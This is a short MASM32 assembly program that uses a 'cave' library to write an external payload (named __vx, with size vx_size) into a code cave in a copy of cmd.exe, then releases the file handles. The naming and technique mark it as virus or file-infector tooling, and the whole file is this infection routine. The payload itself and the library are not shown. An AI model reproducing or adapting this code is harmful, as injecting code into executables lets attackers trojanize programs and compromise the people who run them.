.386
.model        flat,stdcall
option        casemap:none

include       include\windows.inc
include       include\kernel32.inc
include       include\masm32.inc
include       include\msvcrt.inc
include       .\cave.inc

includelib     C:\masm32\lib\kernel32.lib
includelib     C:\masm32\lib\msvcrt.lib

externdef      stdcall __vx:near
externdef      vx_size:dword
externdef      __vx_end:byte



.data
 file_name db 'F:\CAVE\cmd.exe',00h
 cave_hnds CAVE_HNDS <0,0,0,0,0,0,0,0,0,<0>,<0>,<0>,<0>,<0>,<0>>

.code
start:
  push      offset file_name
  push      offset cave_hnds
  call      cave_init
  .if       eax == __NO_ERROR
  
  push      vx_size
  push      __vx
  push      offset cave_hnds
  call      cave_add_code

  push      offset cave_hnds
  call      cave_release 

  .else 
  
  .if eax == __FILE_OPEN_ERROR
    nop
  .endif 
  
  .if eax == __INVALID_SIZE_ERROR
    nop
  .endif
  
  .endif
  ret 
end start
